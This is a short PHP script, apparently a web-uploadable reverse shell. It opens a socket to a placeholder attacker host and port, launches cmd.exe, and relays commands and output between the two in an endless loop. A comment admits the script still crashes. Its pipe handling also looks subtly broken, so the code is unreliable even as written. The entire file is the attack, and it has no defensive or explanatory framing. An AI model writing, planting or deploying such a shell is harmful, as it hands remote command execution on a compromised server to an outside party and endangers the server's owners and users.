<?php
    // NOTE: This script still needs work. Still crashes occasionally. 
    // Set an unlimited execution time (you may want to adjust this for security)
    set_time_limit(0);
    
    // Replace these placeholders with your actual attacker host and port
    $remoteHost = "ATTACKER_IP";
    $remotePort = ATTACKER_PORT;

    // Create a socket connection to the remote host and port
    $sock = fsockopen($remoteHost, $remotePort);

    // Define pipes for process communication
    $pipes = array(
        0 => array("pipe", "r"), // Child's stdin (to write commands)
        1 => array("pipe", "w"), // Child's stdout (to read output)
        2 => array("pipe", "w")  // Child's stderr (to read error messages)
    );

    // Open a command shell (cmd.exe) and create a process
    $process = proc_open("cmd.exe 2>&1", $pipes, $pipes);

    // Continuously relay data between the socket and the command shell
    while (1) {
        // Read data from the socket and write it to the command shell's stdin
        fwrite($pipes[0], fread($sock, 2048));

        // Read data from the command shell's stdout and write it to the socket
        fwrite($sock, fread($pipes[1], 2048));
    }
?>
